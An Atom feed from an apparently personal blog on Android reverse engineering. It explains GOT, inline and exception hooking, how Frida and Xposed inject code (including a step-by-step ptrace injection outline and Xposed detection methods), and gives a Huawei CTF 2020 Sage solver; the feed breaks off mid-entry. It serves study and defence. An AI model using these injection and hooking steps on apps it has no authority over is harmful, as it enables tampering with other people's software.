<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Stay foolish,stay hungry!</title>
  
  <subtitle>安卓程序分析 ctf reverse</subtitle>
  <link href="http://pidanxu.github.io/atom.xml" rel="self"/>
  
  <link href="http://pidanxu.github.io/"/>
  <updated>2022-05-22T07:37:10.418Z</updated>
  <id>http://pidanxu.github.io/</id>
  
  <author>
    <name>Xzhah</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>android study 2</title>
    <link href="http://pidanxu.github.io/2022/05/13/android-study-2/"/>
    <id>http://pidanxu.github.io/2022/05/13/android-study-2/</id>
    <published>2022-05-13T13:18:19.000Z</published>
    <updated>2022-05-22T07:37:10.418Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Android-native-hook原理"><a href="#Android-native-hook原理" class="headerlink" title="Android native hook原理"></a>Android native hook原理</h1><h1 id="1-android-got-hook"><a href="#1-android-got-hook" class="headerlink" title="1. android got hook"></a>1. android got hook</h1><h2 id="1-1-GOT-AND-PLT"><a href="#1-1-GOT-AND-PLT" class="headerlink" title="1.1 GOT AND PLT"></a>1.1 GOT AND PLT</h2><p>​    和windows的IAT HOOK一样，当程序调用外部函数时，需要先跳转到PLT(<code>Procedure Link Table</code> 程序链接表，位于代码段)，再跳转到GOT(<code>Global Offset Table</code> 全局偏移表，位于数据段)，执行目标函数。</p><p>​    既然GOT表中已经有了外部函数的真实地址，为什么还需要PLT表呢？因为存在延迟绑定(<code>Lazy Binding</code>)：当外部函数被调用时，才进行地址解析和重定位。所以PLT表是服务于延迟绑定而存在的。</p><p>​    PLT表内容如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">jmp got[xx]#第一次调用前，linker会把got表相应的函数填为该jmp的下一条指令</span><br><span class="line">pushq $0x? #可以认为是函数标志，告诉_dl_runtime_resolve函数要填哪个函数的got表地址</span><br><span class="line">jmp _dl_runtime_resolve #让Linker填写GOT表地址</span><br></pre></td></tr></table></figure><h2 id="1-2-如何完成got-hook"><a href="#1-2-如何完成got-hook" class="headerlink" title="1.2 如何完成got hook?"></a>1.2 如何完成got hook?</h2><p>​    在已经完成注入的情况下，要完成got hook可以拆分为以下四个步骤。感觉和ctf 的一些简单pwn题差异不大，pwn需要泄露基地址，泄露libc的加载地址。只不过呢，pwn菜单题里面拿got表地址是直接拖到IDA里面去拿，而且要找漏洞利用点去覆写got表。got hook因为是已经完成注入，所以可以直接写，只需要解析elf文件自动拿到got偏移和so加载地址就好了。</p><p>​    1.找到GOT表在ELF文件中的偏移</p><p>​    2.找到GOT表所在模块加载的基址</p><p>​    3.定位到想要hook的函数</p><p>​    4.将自定义函数的地址进行覆盖</p><h2 id="2-inline-hook"><a href="#2-inline-hook" class="headerlink" title="2.inline hook"></a>2.inline hook</h2><p>​    inline hook就是把目标函数的前几条指令改为jmp 指令，jmp到一块shellcode的地方，然后在shellcode的地方调用自己已经注册的自定义函数，然后再执行之前被覆盖的指令，最后跳回目标函数位置。</p><h2 id="3-Exception-hook"><a href="#3-Exception-hook" class="headerlink" title="3.Exception hook"></a>3.Exception hook</h2><h3 id="3-1-Exception-hook原理"><a href="#3-1-Exception-hook原理" class="headerlink" title="3.1 Exception hook原理"></a>3.1 Exception hook原理</h3><p>​    Exception hook的缺点是执行效率较低，原理是每次在目标指令处制造一个不合法指令，这样进程执行到目标指令处会收到信号<em>SIGILL</em>（illegal instruction），从而进入到我们可以注册的Signal handler中，在异常处理函数中首先执行自定义逻辑，然后把原目标指令恢复，把下一条目标指令改为非法指令即可。</p><h3 id="3-2-如何注册signal-handler"><a href="#3-2-如何注册signal-handler" class="headerlink" title="3.2 如何注册signal handler"></a>3.2 如何注册signal handler</h3><p>​    使用sigaction函数，详情见<a href="https://www.man7.org/linux/man-pages/man2/sigaction.2.html。这个函数是用来在接收到异常信号后进行处理的，第二个结构体参数里面可以放入用户自定义的处理函数。" target="_blank" rel="noopener">https://www.man7.org/linux/man-pages/man2/sigaction.2.html。这个函数是用来在接收到异常信号后进行处理的，第二个结构体参数里面可以放入用户自定义的处理函数。</a></p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p><a href="https://www.cnblogs.com/mmmmar/p/8227915.html" target="_blank" rel="noopener">https://www.cnblogs.com/mmmmar/p/8227915.html</a></p><p>​    </p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Android-native-hook原理&quot;&gt;&lt;a href=&quot;#Android-native-hook原理&quot; class=&quot;headerlink&quot; title=&quot;Android native hook原理&quot;&gt;&lt;/a&gt;Android native hook原理&lt;/</summary>
      
    
    
    
    
    <category term="android-hook" scheme="http://pidanxu.github.io/tags/android-hook/"/>
    
  </entry>
  
  <entry>
    <title>android study 1</title>
    <link href="http://pidanxu.github.io/2022/05/10/android-study-1/"/>
    <id>http://pidanxu.github.io/2022/05/10/android-study-1/</id>
    <published>2022-05-09T16:06:33.000Z</published>
    <updated>2022-05-12T13:04:26.851Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Frida、Xposed原理"><a href="#Frida、Xposed原理" class="headerlink" title="Frida、Xposed原理"></a>Frida、Xposed原理</h1><h2 id="1-胡说八道"><a href="#1-胡说八道" class="headerlink" title="1.胡说八道"></a>1.胡说八道</h2><p>​    我对于hook原理的想法就是，要么把地址替换了(如got hook)，要么插入一些代码劫持控制流完成自己的功能(如inline hook)。</p><p>​    Frida/Xposed使用的是动态二进制插桩技术，可以在程序运行的时候注入代码。</p><p>​    对于Android 5.0以下，采用dalvik虚拟机，frida和xposed这时的原理是相同的。</p><h2 id="2-xposed-hook原理"><a href="#2-xposed-hook原理" class="headerlink" title="2.xposed hook原理"></a>2.xposed hook原理</h2><h3 id="2-1-background："><a href="#2-1-background：" class="headerlink" title="2.1 background："></a>2.1 background：</h3><p>​    android启动的第一个用户空间进程是Init进程，init随后会创建zygote进程，android应用程序进程都是由zygote fork出来的。zygote对应的二进制程序是app_process，xposed 框架就是通过替换系统的 app_process 可执行文件以及虚拟机动态链接库，让 zygote 在启动应用程序进程时注入框架代码，进而实现对应用程序进程的劫持。</p><p>​    zygote进程启动流程如下：</p><ol><li>调用 AppRuntime start 方法，启动 zygote 进程。</li><li>创建 Java 虚拟机，并为虚拟机注册 JNI 方法。成为java进程的母体，用于孵化java进程</li><li>通过 JNI 调用 ZygoteInit 的 main 方法进入 Java 框架层。</li><li>注册服务端 Socket ，等待 ActivityManagerService 请求创建应用程序进程。</li><li><p>开启 SystemServer 进程。</p><p>总的来说可以参考下图</p></li></ol><img src="/2022/05/10/android-study-1/start_zygote_flow.jpg"><h3 id="2-2-xposed-java-method-hook原理"><a href="#2-2-xposed-java-method-hook原理" class="headerlink" title="2.2 xposed java method hook原理"></a>2.2 xposed java method hook原理</h3><p>​    Xposed ，就是用自己实现的app_process替换掉了系统原本提供的app_process，加载一个额外的jar包，然后入口从原来的<code>com.android.internal.osZygoteInit.main()</code>被替换成了<code>de.robv.android.xposed.XposedBridge.main()</code>，然后创建的Zygote进程就变成Hook的Zygote进程了，而后面zygote Fork出来的进程也是被Hook过的。这个Jar包XposedBridge.jar，就会被加载到每个安卓进程中。这样一来就可以完成对zygote创建出来的dalvik虚拟机的劫持，从而修改Method结构体，将java method改为native method。然后这个native method其实就是需要插进去的<strong>自定义函数</strong>，最后自定义函数运行完再调用被Hook的原函数。</p><p>​    XposedBridge有一个私有的Native方法：hookMethodNative，这个方法也在app_process中使用。该函数提供一个方法对象利用Java的反射机制来对内置的方法覆写。zygote进程加载XposedBridge将所有需要替换的Method通过JNI方法hookMethodNative指向Native方法</p><h3 id="2-3-xposed检测方法"><a href="#2-3-xposed检测方法" class="headerlink" title="2.3 xposed检测方法"></a>2.3 xposed检测方法</h3><ol><li><strong>通过PackageManager查看安装列表</strong>,通过调用Package Manager API，看安装的app中是否有Xposed Installer</li><li><strong>制造异常读取栈</strong>，既然xposed会劫持每个安卓进程，那么在处理异常的栈里也应该出现xposed的身影</li><li><strong>检测是否有java methodB变为native method</strong>,通过反射调用Modifier.isNative(method.getModifiers()),看是否有相关的Java method变成了Native method。从而判断是否有xposed进来Hook了。</li><li><strong>通过反射读取XposedHelper字段</strong>，读取methodCache(hashmap)相关变量,如果key中有来自app的方法，则可认为有xposed注入。</li><li><strong>在Native层使用c/c++解析/proc/self/maps文件</strong>，检测app加载的库里是否有XposedBridge.jar的存在。</li></ol><h2 id="3-Frida-hook原理"><a href="#3-Frida-hook原理" class="headerlink" title="3. Frida hook原理"></a>3. Frida hook原理</h2><h3 id="3-1-Frida-注入代码原理"><a href="#3-1-Frida-注入代码原理" class="headerlink" title="3.1 Frida 注入代码原理"></a>3.1 Frida 注入代码原理</h3><h4 id="3-1-1-ptrace"><a href="#3-1-1-ptrace" class="headerlink" title="3.1.1 ptrace"></a>3.1.1 ptrace</h4><p>​    ptrace是linux提供的API函数, 它可以监视和控制进程运行，可以动态修改进程的内存，寄存器值。它一般被用来调试。ida动态调试so，就是基于ptrace实现的。因为一个进程只能被ptrace一次, 所以进程可以自己ptrace自己，这样ida和别的基于ptrace的工具和调试器或就无法调试这个进程了。ptrace注入流程如下:</p><p>​    1.attach到远程进程；<br>​    2.保存寄存器环境<br>​    3.远程调用mmap函数分配内存空间<br>​    4.向远程进程写入加载模块名称和调用函数<br>​    5.通过dlopne打开注入模块<br>​    6.dlsym获取调用函数地址<br>​    7.远程调用注入模块的函数<br>​    8.恢复寄存器<br>​    9.剥离远程进程</p><h3 id="3-1-2-Frida通过ptrace注入"><a href="#3-1-2-Frida通过ptrace注入" class="headerlink" title="3.1.2 Frida通过ptrace注入"></a>3.1.2 Frida通过ptrace注入</h3><p>​    Frida是通过ptrace在进程里注入一个agent，然后通过agent来完成hook。</p><p>​    什么是agent?agent是Frida注入到进程中的动态库。</p><p>​    <strong>frida 的进程注入是通过 ptrace 实现的</strong>，注入之后会在远端进程分配一段内存将 agent 拷贝过去并在目标进程中执行代码，<strong>执行完成后会 detach 目标进程</strong>。frida-agent 注入到目标进程并启动后会启动一个新进程与 host 进行通信，从而 host 可以给目标进行发送命令，比如执行代码，激活/关闭 hook，同时也能接收到目标进程的执行返回以及异步事件信息等。</p><h3 id="3-2-额外插一句System-server-agent"><a href="#3-2-额外插一句System-server-agent" class="headerlink" title="3.2 额外插一句System-server agent"></a>3.2 额外插一句System-server agent</h3><p>​    除了注入到目标进程的 agent，还有一个 agent，即 <code>system_server_agent</code>。</p><p>​    Frida会用该agent对SystemServer 进行注入，参考2.1节内容，可知SystemServer 是zygote中启动的第一个进程，同时也是系统中启动的第一个java进程，其中包含了AMS和PMS等系统服务。对SystemService注入，Frida则可以获取系统中的应用信息，以及可以完成一些相应的功能</p><p>​    以获取当前窗口中展示在最上层的应用功能为例，接口为 <code>get_frontmost_application</code>，最终的实现在 <code>SystemServerAgent</code>:</p><h3 id="3-3-Frida的ART-HOOK实现"><a href="#3-3-Frida的ART-HOOK实现" class="headerlink" title="3.3 Frida的ART HOOK实现"></a>3.3 Frida的ART HOOK实现</h3><h4 id="3-3-1-art和dalvik的区别"><a href="#3-3-1-art和dalvik的区别" class="headerlink" title="3.3.1 art和dalvik的区别"></a>3.3.1 art和dalvik的区别</h4><p>​    Dalvik虚拟机是基于apache的java虚拟机，并被改进以适应低内存，低处理器速度的移动设备环境。Dalvik虚拟机依赖于Linux内核，实现进程隔离与线程调试管理，安全和异常管理，垃圾回收等重要功能。</p><p>​    dalvik依靠JIT(Just-In-Time)编译器去解释字节码。JIT 编译器可以对执行次数频繁的 dex/odex 代码进行编译与优化，将 dex/odex 中的 Dalvik Code（Smali 指令集）翻译成相当精简的 Native Code 去执行。但是问题在于，JIT每次启动都需要重新编译。</p><p>​    ART(android runtime)，相比于dalvik是更加高效的。在于ART引进了一种AOT(ahead of time)的编译策略，Android 7.0后，AOT和JIT是混合存在于ART中的。AOT编译策略会在安装的时候就预编译字节码到机器码，形成quick code模式。quick code模式即通过AOT将Java方法在APP安装时预先编译成机器码以后，在运行时直接执行。那么当然，AOT并不是一定比JIT好的，否则现在ART中也不会是两者并存的模式。</p><p><strong>JIT编译模式的缺点：</strong></p><ul><li>每次启动应用都需要重新编译；</li><li>运行时比较耗电，造成电池额外的开销；</li></ul><p><strong>AOT编译模式的缺点：</strong></p><ul><li>应用安装和系统升级之后的应用优化比较耗时；</li><li><p>优化后文件会占用额外的存储空间；</p><p> 所以呢，应用程序安装时不会将字节码全部编译成机器码，而是在运行时将热点代码编译成机器码。因此在Android系统中，Java方法的执行大概可以分为直接执行机器码（AOT），以及使用解释器解释执行两种模式（JIT）。</p></li></ul><h4 id="3-3-2-art-java-hook原理"><a href="#3-3-2-art-java-hook原理" class="headerlink" title="3.3.2 art java hook原理"></a>3.3.2 art java hook原理</h4><p>​    前面说的两种模式即quick code 模式(直接执行arm机器码)和Interpreter模式(解释执行)。</p><img src="/2022/05/10/android-study-1/art_native_execute.png"><p>​    从上图可以看出，对于一个native method, ART虚拟机首先会尝试quickcode模式执行，检查ARTMethod结构中的entry_point_from_quick_compiled_code成员，这里分3种情况：</p><ol><li>如果函数已经存在quick code, 则指向这个函数对应的 quick code的起始地址，而当quick code不存在时，它的值则会代表其他的意义；</li><li>当一个 java 函数不存在 quick code时，它的值是函数 artQuickToInterpreterBridge 的地址，用以从 quick 模式切换到 Interpreter 模式来解释执行 java 函数代码；</li><li>当一个 java native（JNI）函数不存在 quick code时，它的值是函数 art_quick_generic_jni_trampoline 的地址，用以执行没有quick code的 jni 函数；</li></ol><p>​    那么Frida把一个java method 变成native method类型，是肯定没有quick code的，这时候就需要将entry_point_from_quick_compiled_code成员修改为art_quick_generic_jni_trampoline 的地址。art_quick_generic_jni_trampoline最终会调到entry_point_from_jni，即jni函数的入口。Frida把entry_point_from_jni改为自定义代码的入口，即可达到目的。</p><p>​    Frida把java method改为jni method，需要修改ARTMethod结构体中的这几个值：<br>​    access<em>flags</em> = native<br>​    entry_point_from<em>jni</em> = 自定义代码的入口<br>​    entry_point_from_quick_compiled_code = art_quick_generic_jni_trampoline函数的地址<br>​    entry_point_from_interpreter = artInterpreterToCompiledCodeBridge函数地址(把以interpreter模式调用入口地址指向    artInterpreterToCompiledCodeBridge)</p><h4 id="3-3-3-art-native-hook原理"><a href="#3-3-3-art-native-hook原理" class="headerlink" title="3.3.3 art native hook原理"></a>3.3.3 art native hook原理</h4><p>​    这个我暂时没查到太多资料，改天看看英文参考资料补充一下。</p><p>​    大概就是Frida就是在进程里面注入一个agent，然后agent来inline hook那一套。</p><h2 id="4-References"><a href="#4-References" class="headerlink" title="4.References"></a>4.References</h2><p>ref:<a href="https://mabin004.github.io/2018/07/31/Mac上编译Frida/" target="_blank" rel="noopener">Frida源码分析 | m4bln (mabin004.github.io)</a></p><p>ref:<a href="https://www.jianshu.com/p/51e6aef175a2" target="_blank" rel="noopener">hook工具frida原理及使用 - 简书 (jianshu.com)</a></p><p>ref:<a href="https://www.pythonf.cn/read/164792" target="_blank" rel="noopener">https://www.pythonf.cn/read/164792</a></p><p>ref:<a href="https://zhuanlan.zhihu.com/p/389889716" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/389889716</a></p><p>ref:<a href="https://frida.re/slides/osdc-2015-the-engineering-behind-the-reverse-engineering.pdf" target="_blank" rel="noopener">https://frida.re/slides/osdc-2015-the-engineering-behind-the-reverse-engineering.pdf</a></p><p>ref:<a href="https://tinyniko.github.io/2020/02/12/%E6%97%A7%E5%8D%9A%E5%AE%A2%E5%BC%95%E5%AF%BC/Frida.pdf" target="_blank" rel="noopener">https://tinyniko.github.io/2020/02/12/%E6%97%A7%E5%8D%9A%E5%AE%A2%E5%BC%95%E5%AF%BC/Frida.pdf</a></p><p>ref: <a href="https://evilpan.com/2022/04/09/frida-core/" target="_blank" rel="noopener">https://evilpan.com/2022/04/09/frida-core/</a></p><p>ref:<a href="https://xw.qq.com/cmsid/20211201A07SF300" target="_blank" rel="noopener">【创宇小课堂】移动安全-xposed检测原理|xposed|zygote|dalvik|java|xposed框架|虚拟机 (qq.com)</a></p><p>ref: <a href="https://cloud.tencent.com/developer/article/1578515" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1578515</a></p><p>ref: <a href="https://tech.meituan.com/2018/02/02/android-anti-hooking.html" target="_blank" rel="noopener">https://tech.meituan.com/2018/02/02/android-anti-hooking.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Frida、Xposed原理&quot;&gt;&lt;a href=&quot;#Frida、Xposed原理&quot; class=&quot;headerlink&quot; title=&quot;Frida、Xposed原理&quot;&gt;&lt;/a&gt;Frida、Xposed原理&lt;/h1&gt;&lt;h2 id=&quot;1-胡说八道&quot;&gt;&lt;a href=&quot;</summary>
      
    
    
    
    
    <category term="android-hook" scheme="http://pidanxu.github.io/tags/android-hook/"/>
    
  </entry>
  
  <entry>
    <title>huaweictf2020</title>
    <link href="http://pidanxu.github.io/2020/12/28/huaweictf2020/"/>
    <id>http://pidanxu.github.io/2020/12/28/huaweictf2020/</id>
    <published>2020-12-28T13:55:41.000Z</published>
    <updated>2021-02-18T05:13:32.968Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2020华为CTF"><a href="#2020华为CTF" class="headerlink" title="2020华为CTF"></a>2020华为CTF</h1><p>三场比赛的时候都没啥时间，匆匆看了几道题</p><h2 id="第一场"><a href="#第一场" class="headerlink" title="第一场"></a>第一场</h2><p>divination</p><p>主要逻辑就是循环左移,循环右移,异或。那其实每个bit就是循环移位过后的二进制加法，可以视为一个线性方程组。用sage进行求解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">rol = <span class="keyword">lambda</span> val, r_bits, max_bits: \</span><br><span class="line"></span><br><span class="line">    (val &lt;&lt; r_bits%max_bits) &amp; (<span class="number">2</span>**max_bits<span class="number">-1</span>) | \</span><br><span class="line"></span><br><span class="line">    ((val &amp; (<span class="number">2</span>**max_bits<span class="number">-1</span>)) &gt;&gt; (max_bits-(r_bits%max_bits)))</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="comment"># Rotate right: 0b1001 --&gt; 0b1100</span></span><br><span class="line"></span><br><span class="line">ror = <span class="keyword">lambda</span> val, r_bits, max_bits: \</span><br><span class="line"></span><br><span class="line">    ((val &amp; (<span class="number">2</span>**max_bits<span class="number">-1</span>)) &gt;&gt; r_bits%max_bits) | \</span><br><span class="line"></span><br><span class="line">    (val &lt;&lt; (max_bits-(r_bits%max_bits)) &amp; (<span class="number">2</span>**max_bits<span class="number">-1</span>))</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">max_bits = <span class="number">256</span>  <span class="comment"># For fun, try 2, 17 or other arbitrary (positive!) values</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span><span class="params">(input)</span>:</span></span><br><span class="line"></span><br><span class="line">list1=[<span class="number">13</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">23</span>, <span class="number">29</span>, <span class="number">31</span>, <span class="number">37</span>, <span class="number">41</span>, <span class="number">43</span>, <span class="number">47</span>, <span class="number">53</span>, <span class="number">59</span>, <span class="number">61</span>, <span class="number">67</span>, <span class="number">71</span>, <span class="number">73</span>, <span class="number">79</span>, <span class="number">83</span>, <span class="number">89</span>, <span class="number">97</span>, <span class="number">101</span>, <span class="number">103</span>, <span class="number">107</span>, <span class="number">109</span>, <span class="number">113</span>, <span class="number">127</span>]</span><br><span class="line"></span><br><span class="line">xor_res=input</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(list1)):</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> i%<span class="number">2</span>==<span class="number">0</span>:</span><br><span class="line"></span><br><span class="line">t1=rol(input,list1[i],<span class="number">256</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">t1=ror(input,list1[i],<span class="number">256</span>)</span><br><span class="line"></span><br><span class="line">xor_res=(xor_res^^t1)&amp; <span class="number">0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> hex(xor_res),hex(t1)</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> xor_res</span><br></pre></td></tr></table></figure><p><strong>solve.exp</strong></p><p>把f变换视为变换视为A*B=C</p><p>32字节的flag，可以视为256个未知数(每个bit为一个未知数),A为256<em>256的参数矩阵，B为1\</em>256的未知数向量，C为密文。</p><p>那么为了求得A矩阵，我们可以构造256<em>256个随机数矩阵B1，得A\</em>B1=C1。那么C1，B1已知，自然能得到矩阵A，从而得到A的逆矩阵~A,那么B=~A*C,自然求得未知数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">rol = <span class="keyword">lambda</span> val, r_bits, max_bits: \</span><br><span class="line">    (val &lt;&lt; r_bits%max_bits) &amp; (<span class="number">2</span>**max_bits<span class="number">-1</span>) | \</span><br><span class="line">    ((val &amp; (<span class="number">2</span>**max_bits<span class="number">-1</span>)) &gt;&gt; (max_bits-(r_bits%max_bits)))</span><br><span class="line"><span class="comment"># Rotate right: 0b1001 --&gt; 0b1100</span></span><br><span class="line">ror = <span class="keyword">lambda</span> val, r_bits, max_bits: \</span><br><span class="line">    ((val &amp; (<span class="number">2</span>**max_bits<span class="number">-1</span>)) &gt;&gt; r_bits%max_bits) | \</span><br><span class="line">    (val &lt;&lt; (max_bits-(r_bits%max_bits)) &amp; (<span class="number">2</span>**max_bits<span class="number">-1</span>))</span><br><span class="line">max_bits = <span class="number">256</span>  <span class="comment"># For fun, try 2, 17 or other arbitrary (positive!) values</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span><span class="params">(input)</span>:</span></span><br><span class="line">list1=[<span class="number">13</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">23</span>, <span class="number">29</span>, <span class="number">31</span>, <span class="number">37</span>, <span class="number">41</span>, <span class="number">43</span>, <span class="number">47</span>, <span class="number">53</span>, <span class="number">59</span>, <span class="number">61</span>, <span class="number">67</span>, <span class="number">71</span>, <span class="number">73</span>, <span class="number">79</span>, <span class="number">83</span>, <span class="number">89</span>, <span class="number">97</span>, <span class="number">101</span>, <span class="number">103</span>, <span class="number">107</span>, <span class="number">109</span>, <span class="number">113</span>, <span class="number">127</span>]</span><br><span class="line">xor_res=input</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(list1)):</span><br><span class="line"><span class="keyword">if</span> i%<span class="number">2</span>==<span class="number">0</span>:</span><br><span class="line">t1=rol(input,list1[i],<span class="number">256</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">t1=ror(input,list1[i],<span class="number">256</span>)</span><br><span class="line">xor_res=(xor_res^^t1)&amp; <span class="number">0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF</span></span><br><span class="line"><span class="keyword">print</span> hex(xor_res),hex(t1)</span><br><span class="line"><span class="keyword">return</span> xor_res</span><br><span class="line"><span class="keyword">print</span> <span class="comment">#hex(rol(0x3132333435363738393031323334353637383930313233343536373839303132,0xd,256))</span></span><br><span class="line"><span class="keyword">print</span> hex(rol(<span class="number">0x3231303938373635343332313039383736353433323130393837363534333231</span>,<span class="number">0xd</span>,<span class="number">256</span>))</span><br><span class="line"><span class="keyword">print</span> hex(f(<span class="number">0x3231303938373635343332313039383736353433323130393837363534333231</span>))</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calL</span><span class="params">()</span>:</span></span><br><span class="line">    t = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):        t.append(random.randint(<span class="number">0</span>,<span class="number">0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span>))</span><br><span class="line">    tmp = []</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> t:</span><br><span class="line">        tmp.append(f(x))</span><br><span class="line">    inp = t</span><br><span class="line">    outp = tmp</span><br><span class="line">    I = Integers(<span class="number">2</span>)</span><br><span class="line">    tmp = []</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> inp:</span><br><span class="line">        t =map(int ,bin(x)[<span class="number">2</span>:].zfill(<span class="number">256</span>))</span><br><span class="line">        tmp.append(t)</span><br><span class="line">    a = matrix(I,tmp)</span><br><span class="line">    tmp = []</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> outp:</span><br><span class="line">        t =map(int ,bin(x)[<span class="number">2</span>:].zfill(<span class="number">256</span>))</span><br><span class="line">        tmp.append(t)</span><br><span class="line">    b = matrix(I,tmp)</span><br><span class="line">    L =  a.solve_right(b)</span><br><span class="line">    L =  L</span><br><span class="line">    <span class="keyword">return</span> L</span><br><span class="line">L  = calL()</span><br><span class="line"><span class="keyword">print</span> L</span><br><span class="line">ans = [<span class="number">0xe7764526f1acd0de2548d47dbf701b1988645a56c60fcf307a043dd816d74e5a</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recover</span><span class="params">(c,L)</span>:</span></span><br><span class="line">    I = Integers(<span class="number">2</span>)</span><br><span class="line">    tmp = []</span><br><span class="line">    t =map(int ,bin(c)[<span class="number">2</span>:].zfill(<span class="number">256</span>))</span><br><span class="line">    v = vector(I,t)</span><br><span class="line">    r = v*L</span><br><span class="line">    <span class="keyword">return</span> int(<span class="string">''</span>.join( map(str,map(int,r)) ),<span class="number">2</span>)</span><br><span class="line">L = ~L</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="number">0x5A</span>,<span class="number">0x4E</span>,<span class="number">0xD7</span>,<span class="number">0x16</span>,<span class="number">0xD8</span>,<span class="number">0x3D</span>,<span class="number">4</span>,<span class="number">0x7A</span>,<span class="number">0x30</span>,<span class="number">0xCF</span>,<span class="number">0xF</span>,<span class="number">0xC6</span>,<span class="number">0x56</span>,<span class="number">0x5A</span>,<span class="number">0x64</span>,<span class="number">0x88</span>,<span class="number">0x19</span>,<span class="number">0x1B</span>,<span class="number">0x70</span>,<span class="number">0xBF</span>,<span class="number">0x7D</span>,<span class="number">0xD4</span>,<span class="number">0x48</span>,<span class="number">0x25</span>,<span class="number">0xDE</span>,<span class="number">0xD0</span>,<span class="number">0xAC</span>,<span class="number">0xF1</span>,<span class="number">0x26</span>,<span class="number">0x45</span>,<span class="number">0x76</span>,<span class="number">0xE7</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> ans:</span><br><span class="line">tmp = recover(k,L)</span><br><span class="line"><span class="keyword">print</span> hex(tmp)</span><br><span class="line">s = hex(tmp)[<span class="number">2</span>:].decode(<span class="string">'hex'</span>)[::<span class="number">-1</span>]</span><br><span class="line"><span class="keyword">print</span> s</span><br><span class="line">flag+=s</span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure><h3 id="第二场"><a href="#第二场" class="headerlink" title="第二场"></a>第二场</h3><p>题目</p><figure class="highlight python"><table><tr><td 